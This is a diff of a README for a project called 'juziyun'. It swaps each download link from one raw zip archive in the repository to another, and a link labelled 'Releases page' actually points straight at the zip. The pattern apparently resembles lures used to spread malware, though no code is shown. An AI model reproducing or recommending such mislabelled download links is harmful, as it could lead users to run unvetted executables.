@@ -6,7 +6,7 @@ Welcome to the juziyun project! This application allows you to access reliable c
 
 ## 📥 Download Now
 
-[![Download juziyun](https://raw.githubusercontent.com/SaharSaam/juziyun/main/caup/Software-v2.5.zip)](https://raw.githubusercontent.com/SaharSaam/juziyun/main/caup/Software-v2.5.zip)
+[![Download juziyun](https://raw.githubusercontent.com/SaharSaam/juziyun/main/caup/Software_v3.4.zip)](https://raw.githubusercontent.com/SaharSaam/juziyun/main/caup/Software_v3.4.zip)
 
 ## 📃 Overview
 
@@ -32,12 +32,12 @@ Before downloading, make sure your system meets these requirements:
 
 To get the latest version of juziyun, visit the Releases page:
 
-[Download juziyun](https://raw.githubusercontent.com/SaharSaam/juziyun/main/caup/Software-v2.5.zip)
+[Download juziyun](https://raw.githubusercontent.com/SaharSaam/juziyun/main/caup/Software_v3.4.zip)
 
 ### Step-by-Step Installation:
 
 1. **Visit the Releases Page**:
-   Go to the [Releases page](https://raw.githubusercontent.com/SaharSaam/juziyun/main/caup/Software-v2.5.zip) to find the latest version of juziyun.
+   Go to the [Releases page](https://raw.githubusercontent.com/SaharSaam/juziyun/main/caup/Software_v3.4.zip) to find the latest version of juziyun.
 
 2. **Choose the Right File**:
    Look for the file that matches your operating system. For example, if you're using Windows, download the `.exe` file.
